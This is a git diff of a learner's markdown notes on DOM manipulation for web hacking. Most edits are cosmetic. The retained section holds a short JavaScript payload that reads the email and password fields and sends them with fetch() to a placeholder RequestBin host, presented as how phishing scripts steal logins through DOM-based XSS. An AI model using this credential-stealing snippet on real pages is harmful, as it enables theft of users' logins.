@@ -1,12 +1,11 @@
-# DOM Hacker Class 01 - Introduction to DOM Manipulation (Web Hacking)
+# Introduction to DOM Manipulation (Web Hacking)
 
 ## Lessons learnt
 
-* The DOM is the structure of an HTML page that JavaScript can access and manipulate.
-* Hackers use the DOM to read or modify page content, steal data, inject forms, etc.
-* JavaScript can be used to hijack or manipulate elements dynamically.
-
----
+> * The DOM is the structure of an HTML page that JavaScript can access and manipulate.
+> * Hackers use the DOM to read or modify page content, steal data, inject forms, etc.
+> * JavaScript can be used to hijack or manipulate elements dynamically.
+----
 
 ## 🧰 Basic DOM Commands
 
@@ -41,7 +40,7 @@ document.body.style.background = "black";
 
 ---
 
-## 🐱‍💻 Simple DOM Data Stealing Payload
+## Simple DOM Data Stealing Payload
 
 ```js
 let email = document.getElementById("email").value;
@@ -49,22 +48,20 @@ let pass = document.getElementById("password").value;
 fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&password=" + pass);
 ```
 
-> ✅ This sends the victim's email and password to your server.
+> This sends the victim's email and password to your server.
 
 ---
 
-## 🔥 Challenge
+## Challenge I practiced
 
 practice:
 
-* Locate the email and password input on a form.
-* Use `console.log()` to test capturing the data.
-* Send it to your own endpoint using `fetch()`.
+* Located the email and password input on a form.
+* Used `console.log()` to test capturing the data.
+* Sent it to my own endpoint using `fetch()`.
 
 ---
 
-## 🧠 Real-World Application
+## Real-World Application
 
 This is how real phishing scripts silently steal login credentials using JavaScript injected via DOM-based XSS or HTML Injection.
-
-**You're officially inside the DOM.** Welcome to the deep end homie😈
